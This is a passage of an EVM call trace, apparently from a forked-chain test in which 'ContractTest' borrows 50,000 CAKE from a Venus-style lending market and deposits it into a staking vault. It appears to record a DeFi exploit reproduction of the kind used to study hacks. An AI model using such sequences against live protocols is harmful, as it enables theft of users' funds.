    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0, 1842280795285372 [1.842e15], 0, 217122167817007095976741999 [2.171e26]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000068b8b6c61277c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b399684d564c8bca26cc6f
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0, 1842280795285372 [1.842e15], 0, 217122167817007095976741999 [2.171e26]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5550] 0xfD36E2c2a6789Db23113685031d7F16329158384::markets(0x95c78222B3D6e262426483D42CfA53685A67Ab9D) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4855] 0xAe8Ba50ee0a0E55EC21bf4ffE2c48d2FdF52D3e6::markets(0x95c78222B3D6e262426483D42CfA53685A67Ab9D) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true, 800000000000000000 [8e17], true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true, 800000000000000000 [8e17], true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1182] 0xfD36E2c2a6789Db23113685031d7F16329158384::oracle() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [514] 0xAe8Ba50ee0a0E55EC21bf4ffE2c48d2FdF52D3e6::oracle() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0xd8B6dA2bfEC71D684D3E2a2FC9492dDad5C3787F
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0xd8B6dA2bfEC71D684D3E2a2FC9492dDad5C3787F
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [39173] 0xd8B6dA2bfEC71D684D3E2a2FC9492dDad5C3787F::getUnderlyingPrice(0x95c78222B3D6e262426483D42CfA53685A67Ab9D) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3122] 0x95c78222B3D6e262426483D42CfA53685A67Ab9D::symbol() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] "vBUSD"
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [470] 0x95c78222B3D6e262426483D42CfA53685A67Ab9D::underlying() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3081] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::symbol() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] "BUSD"
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5640] 0xcBb98864Ef56E9042e7d2efef76141f15731B82f::decimals() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [298] 0x7A6BB3a3C0C99bA43564017D7523a74BA0f7cB5d::decimals() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 8
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 8
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [10137] 0xcBb98864Ef56E9042e7d2efef76141f15731B82f::latestAnswer() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [7141] 0x7A6BB3a3C0C99bA43564017D7523a74BA0f7cB5d::latestAnswer() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 100004889 [1e8]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 100004889 [1e8]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2425] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::decimals() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 18
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 1000048890000000000 [1e18]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [14419] 0x86aC3974e2BD0d60825230fa6F355fF11409df5c::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [11571] 0x86aC3974e2BD0d60825230fa6F355fF11409df5c::delegateToImplementation(0xc37f68e20000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [9686] 0x13f816511384D3534783241ddb5751c4b7a7e148::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [531] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::balanceOf(0x86aC3974e2BD0d60825230fa6F355fF11409df5c) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3450596464865196778065127 [3.45e24]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0, 0, 0, 260582773673731278274850545 [2.605e26]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000d78c8c776a70af40586ef1
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0, 0, 0, 260582773673731278274850545 [2.605e26]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5550] 0xfD36E2c2a6789Db23113685031d7F16329158384::markets(0x86aC3974e2BD0d60825230fa6F355fF11409df5c) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4855] 0xAe8Ba50ee0a0E55EC21bf4ffE2c48d2FdF52D3e6::markets(0x86aC3974e2BD0d60825230fa6F355fF11409df5c) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true, 550000000000000000 [5.5e17], false
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true, 550000000000000000 [5.5e17], false
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1182] 0xfD36E2c2a6789Db23113685031d7F16329158384::oracle() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [514] 0xAe8Ba50ee0a0E55EC21bf4ffE2c48d2FdF52D3e6::oracle() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0xd8B6dA2bfEC71D684D3E2a2FC9492dDad5C3787F
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0xd8B6dA2bfEC71D684D3E2a2FC9492dDad5C3787F
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [14086] 0xd8B6dA2bfEC71D684D3E2a2FC9492dDad5C3787F::getUnderlyingPrice(0x86aC3974e2BD0d60825230fa6F355fF11409df5c) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1144] 0x86aC3974e2BD0d60825230fa6F355fF11409df5c::symbol() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] "vCAKE"
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [383] 0x86aC3974e2BD0d60825230fa6F355fF11409df5c::underlying() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1081] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::symbol() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] "Cake"
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1140] 0xB6064eD41d4f67e353768aA239cA86f4F73665a1::decimals() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [298] 0x7935a51aDDaB8550D346FEEf34e02F67C9330109::decimals() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 8
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 8
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2137] 0xB6064eD41d4f67e353768aA239cA86f4F73665a1::latestAnswer() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1141] 0x7935a51aDDaB8550D346FEEf34e02F67C9330109::latestAnswer() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 494159292 [4.941e8]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 494159292 [4.941e8]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [403] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::decimals() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 18
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 4941592920000000000 [4.941e18]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3230] 0xfD36E2c2a6789Db23113685031d7F16329158384::mintedVAIs(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2559] 0xAe8Ba50ee0a0E55EC21bf4ffE2c48d2FdF52D3e6::mintedVAIs(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f71de509d1dd50180f00000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [387] 0x86aC3974e2BD0d60825230fa6F355fF11409df5c::borrowIndex() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 1619704391197731712 [1.619e18]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [388] 0x86aC3974e2BD0d60825230fa6F355fF11409df5c::totalBorrows() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 2156257282327781762350568 [2.156e24]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [561] 0xcF6BB5389c92Bdda8a3747Ddb454cB7a64626C63::balanceOf(0xfD36E2c2a6789Db23113685031d7F16329158384) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 15396713908246186889020790 [1.539e25]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [531] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::balanceOf(0x86aC3974e2BD0d60825230fa6F355fF11409df5c) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3450596464865196778065127 [3.45e24]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [27983] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 50000000000000000000000 [5e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0x86aC3974e2BD0d60825230fa6F355fF11409df5c, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 50000000000000000000000 [5e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Borrow(borrower: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], borrowAmount: 50000000000000000000000 [5e22], accountBorrows: 50000000000000000000000 [5e22], totalBorrows: 2206257282327781762350568 [2.206e24])
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [1015] 0xfD36E2c2a6789Db23113685031d7F16329158384::borrowVerify(0x86aC3974e2BD0d60825230fa6F355fF11409df5c, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 50000000000000000000000 [5e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [408] 0xAe8Ba50ee0a0E55EC21bf4ffE2c48d2FdF52D3e6::borrowVerify(0x86aC3974e2BD0d60825230fa6F355fF11409df5c, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 50000000000000000000000 [5e22]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФЬтФА [24586] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::approve(0x489afbAED0Ea796712c9A6d366C16CA3876D8184, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x489afbAED0Ea796712c9A6d366C16CA3876D8184, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФЬтФА [342167] 0x489afbAED0Ea796712c9A6d366C16CA3876D8184::depositAll()
    тФВ   тФВ   тФВ   тФЬтФА [531] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 50000000000000000000000 [5e22]
    тФВ   тФВ   тФВ   тФЬтФА [11164] 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b::balanceOf() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [4761] 0x73feaa1eE314F8c655E354234017bE2193C9E24E::userInfo(0, 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 35390734263842961253205 [3.539e22], 95843398304987854656418109293 [9.584e28]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [2531] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::balanceOf(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 4223457858899253265 [4.223e18]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000077ec3b6755d58dbfb66
    тФВ   тФВ   тФВ   тФЬтФА [2531] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::balanceOf(0x489afbAED0Ea796712c9A6d366C16CA3876D8184) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФЬтФА [531] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::balanceOf(0x489afbAED0Ea796712c9A6d366C16CA3876D8184) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФЬтФА [25894] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x489afbAED0Ea796712c9A6d366C16CA3876D8184, 50000000000000000000000 [5e22])
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x489afbAED0Ea796712c9A6d366C16CA3876D8184, value: 50000000000000000000000 [5e22])
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x489afbAED0Ea796712c9A6d366C16CA3876D8184, value: 115792089237316195423570985008687907853269984665640563989457584007913129639935 [1.157e77])
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФЬтФА [531] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::balanceOf(0x489afbAED0Ea796712c9A6d366C16CA3876D8184) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 50000000000000000000000 [5e22]
    тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 44955527433503234324261 [4.495e22])
    тФВ   тФВ   тФВ   тФЬтФА [531] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::balanceOf(0x489afbAED0Ea796712c9A6d366C16CA3876D8184) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 50000000000000000000000 [5e22]
    тФВ   тФВ   тФВ   тФЬтФА [6083] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::transfer(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, 50000000000000000000000 [5e22])
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0x489afbAED0Ea796712c9A6d366C16CA3876D8184, to: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, value: 50000000000000000000000 [5e22])
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФЬтФА [249121] 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b::deposit()
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [531] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::balanceOf(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 50004223457858899253265 [5e22]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [4686] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::approve(0x73feaa1eE314F8c655E354234017bE2193C9E24E, 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, spender: 0x73feaa1eE314F8c655E354234017bE2193C9E24E, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [594] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::allowance(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, 0x73feaa1eE314F8c655E354234017bE2193C9E24E) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [22486] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::approve(0x73feaa1eE314F8c655E354234017bE2193C9E24E, 50004223457858899253265 [5e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, spender: 0x73feaa1eE314F8c655E354234017bE2193C9E24E, value: 50004223457858899253265 [5e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [118883] 0x73feaa1eE314F8c655E354234017bE2193C9E24E::enterStaking(50004223457858899253265 [5e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2531] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::balanceOf(0x73feaa1eE314F8c655E354234017bE2193C9E24E) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 12811879636383117488727204 [1.281e25]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [11442] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::mint(0xcEba60280fb0ecd9A5A26A1552B90944770a4a0e, 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0xcEba60280fb0ecd9A5A26A1552B90944770a4a0e, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [7442] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::mint(0x009cF7bC57584b7998236eff51b98A168DceA9B0, 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x009cF7bC57584b7998236eff51b98A168DceA9B0, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [12244] 0x009cF7bC57584b7998236eff51b98A168DceA9B0::safeCakeTransfer(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, 53786404578434280321792 [5.378e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [531] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::balanceOf(0x009cF7bC57584b7998236eff51b98A168DceA9B0) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 646392785536581154224613 [6.463e23]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [6083] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::transfer(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, 53786404578434280321792 [5.378e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0x009cF7bC57584b7998236eff51b98A168DceA9B0, to: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, value: 53786404578434280321792 [5.378e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [8794] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::transferFrom(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, 0x73feaa1eE314F8c655E354234017bE2193C9E24E, 50004223457858899253265 [5e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, to: 0x73feaa1eE314F8c655E354234017bE2193C9E24E, value: 50004223457858899253265 [5e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, spender: 0x73feaa1eE314F8c655E354234017bE2193C9E24E, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [32120] 0x009cF7bC57584b7998236eff51b98A168DceA9B0::mint(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, 50004223457858899253265 [5e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, value: 50004223457858899253265 [5e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Deposit(user: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, pid: 0, amount: 50004223457858899253265 [5e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [487] 0x009cF7bC57584b7998236eff51b98A168DceA9B0::balanceOf(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 50004223457858899253265 [5e22]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [4686] 0x009cF7bC57584b7998236eff51b98A168DceA9B0::approve(0xF35d63Df93f32e025bce4A1B98dcEC1fe07AD892, 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, spender: 0xF35d63Df93f32e025bce4A1B98dcEC1fe07AD892, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [594] 0x009cF7bC57584b7998236eff51b98A168DceA9B0::allowance(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, 0xF35d63Df93f32e025bce4A1B98dcEC1fe07AD892) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [22486] 0x009cF7bC57584b7998236eff51b98A168DceA9B0::approve(0xF35d63Df93f32e025bce4A1B98dcEC1fe07AD892, 50004223457858899253265 [5e22])
